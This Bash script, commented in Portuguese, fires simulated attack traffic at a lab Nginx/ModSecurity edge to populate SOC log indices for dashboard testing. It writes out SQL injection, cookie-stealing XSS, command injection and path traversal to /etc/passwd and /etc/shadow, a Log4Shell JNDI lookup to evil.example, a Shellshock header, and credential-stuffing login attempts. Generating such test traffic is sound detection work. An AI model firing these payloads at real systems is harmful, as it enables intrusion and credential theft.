#!/usr/bin/env bash
# Gera tráfego suspeito contra o edge (Nginx + ModSecurity/CRS) para
# popular os índices soc-edge-access-*, soc-edge-waf-* e, opcionalmente,
# soc-api-events-* via collector.
#
# Uso (da sua máquina ou da EC2):
#   EDGE_URL=http://44.223.30.178 ./scripts/simulate-suspicious.sh
#   EDGE_URL=http://127.0.0.1:80  ./scripts/simulate-suspicious.sh
#
# Opcional (só funciona de dentro da EC2 / rede Docker, onde XFF é confiado):
#   SPOOF_XFF=1 ./scripts/simulate-suspicious.sh
#
# Eventos de API (collector só escuta em 127.0.0.1:8081):
#   COLLECTOR_URL=http://127.0.0.1:8081 COLLECTOR_PASSWORD=... ./scripts/simulate-suspicious.sh
set -euo pipefail

EDGE_URL="${EDGE_URL:-http://127.0.0.1:80}"
EDGE_URL="${EDGE_URL%/}"
COLLECTOR_URL="${COLLECTOR_URL:-}"
COLLECTOR_PASSWORD="${COLLECTOR_PASSWORD:-local-dev-only}"
ROUNDS="${ROUNDS:-3}"
DELAY="${DELAY:-0.3}"
SPOOF_XFF="${SPOOF_XFF:-0}"

# IPs "atacantes" fictícios (RFC 5737). Só afetam source.ip se SPOOF_XFF=1
# e SET_REAL_IP_FROM confiar no hop atual (ex.: curl de dentro da EC2).
ATTACKERS=(
  "203.0.113.10"
  "203.0.113.44"
  "198.51.100.77"
  "192.0.2.200"
)

USERS=(admin root alice bob operator backup)
UA_SCANNERS=(
  "sqlmap/1.8.2#stable (https://sqlmap.org)"
  "Nikto/2.5.0"
  "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
  "Wget/1.21"
  "python-requests/2.31.0"
)

log() { printf '[simulate] %s\n' "$*"; }

pick() {
  local -n arr=$1
  echo "${arr[RANDOM % ${#arr[@]}]}"
}

xff_args() {
  if [ "$SPOOF_XFF" = "1" ]; then
    printf -- '-H\0X-Forwarded-For: %s\0' "$(pick ATTACKERS)"
  fi
}

hit() {
  local method="$1" path="$2"
  shift 2
  local -a extra=("$@")
  local -a xff=()
  local ua code

  ua="$(pick UA_SCANNERS)"
  mapfile -d '' -t xff < <(xff_args)

  code="$(curl -sS -o /dev/null -w '%{http_code}' \
    -X "$method" \
    -A "$ua" \
    --connect-timeout 5 \
    --max-time 20 \
    "${xff[@]}" \
    "${extra[@]}" \
    "${EDGE_URL}${path}" || echo "000")"
  printf '  %-6s %-55s -> %s\n' "$method" "$path" "$code"
  sleep "$DELAY"
}

log "alvo: $EDGE_URL  rounds=$ROUNDS  spoof_xff=$SPOOF_XFF"

for ((r = 1; r <= ROUNDS; r++)); do
  log "=== round $r/$ROUNDS: baseline + reconhecimento ==="
  hit GET /
  hit GET /robots.txt
  hit GET /.env
  hit GET /.git/config
  hit GET /server-status
  hit GET /actuator/health
  hit GET /admin
  hit GET /wp-login.php
  hit GET /phpmyadmin/
  hit GET /api/v1/users

  log "=== round $r/$ROUNDS: SQLi ==="
  hit GET "/products?id=1'%20OR%20'1'='1"
  hit GET "/products?id=1%27%20UNION%20SELECT%20password%20FROM%20users--"
  hit GET "/search?q=1;%20DROP%20TABLE%20users--"
  hit GET "/item?id=1)%20AND%20SLEEP(5)--"

  log "=== round $r/$ROUNDS: XSS / RCE ==="
  hit GET "/?q=%3Cscript%3Ealert(1)%3C/script%3E"
  hit GET "/search?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
  hit GET "/?cmd=;cat%20/etc/passwd"
  hit GET "/?file=../../../../etc/passwd"
  hit GET "/download?path=....//....//....//etc/shadow"

  log "=== round $r/$ROUNDS: LFI / path traversal ==="
  hit GET "/static/..%2f..%2f..%2fetc%2fpasswd"
  hit GET "/assets/%2e%2e/%2e%2e/%2e%2e/etc/hosts"
  hit GET "/?page=php://filter/convert.base64-encode/resource=index"

  log "=== round $r/$ROUNDS: force brute / credential stuffing (login paths) ==="
  for user in "${USERS[@]}"; do
    hit POST "/login" \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      --data-urlencode "username=${user}" \
      --data-urlencode "password=Password${RANDOM}!"
  done

  log "=== round $r/$ROUNDS: body / header anômalo ==="
  hit POST "/api/v1/orders" \
    -H 'Content-Type: application/json' \
    -d '{"id":"1 OR 1=1","note":"<script>alert(1)</script>"}'
  hit GET "/api/v1/search?q=\${jndi:ldap://evil.example/a}"
  hit GET "/" -H 'User-Agent: () { :;}; /bin/bash -c "id"'
done

if [ -n "$COLLECTOR_URL" ]; then
  log "=== eventos de API no collector ==="
  COLLECTOR_URL="${COLLECTOR_URL%/}"
  for user in alice bob admin root; do
    ip="$(pick ATTACKERS)"
    code="$(curl -sS -o /dev/null -w '%{http_code}' \
      -u "ingest:${COLLECTOR_PASSWORD}" \
      -H 'Content-Type: application/json' \
      -d "{\"event\":{\"action\":\"login_failed\",\"outcome\":\"failure\"},\"user\":{\"name\":\"${user}\"},\"source\":{\"ip\":\"${ip}\"},\"message\":\"failed login for ${user}\"}" \
      "${COLLECTOR_URL}/v1/api" || echo "000")"
    printf '  POST   /v1/api login_failed user=%-8s ip=%-15s -> %s\n' "$user" "$ip" "$code"
    sleep "$DELAY"
  done
  code="$(curl -sS -o /dev/null -w '%{http_code}' \
    -u "ingest:${COLLECTOR_PASSWORD}" \
    -H 'Content-Type: application/json' \
    -d "{\"event\":{\"action\":\"privilege_escalation\",\"outcome\":\"unknown\"},\"user\":{\"name\":\"bob\"},\"source\":{\"ip\":\"203.0.113.44\"},\"message\":\"sudo attempt on api-host\"}" \
    "${COLLECTOR_URL}/v1/api" || echo "000")"
  printf '  POST   /v1/api privilege_escalation                   -> %s\n' "$code"
else
  log "COLLECTOR_URL não definido; pulando soc-api-events (só disponível em 127.0.0.1:8081 na EC2)"
fi

log "feito. No Dashboards → Discover, use o index pattern soc-* (Last 15 minutes)."
log "Filtros úteis: source.ip, user_agent.original, rule.id, waf.attack_types, url.path"
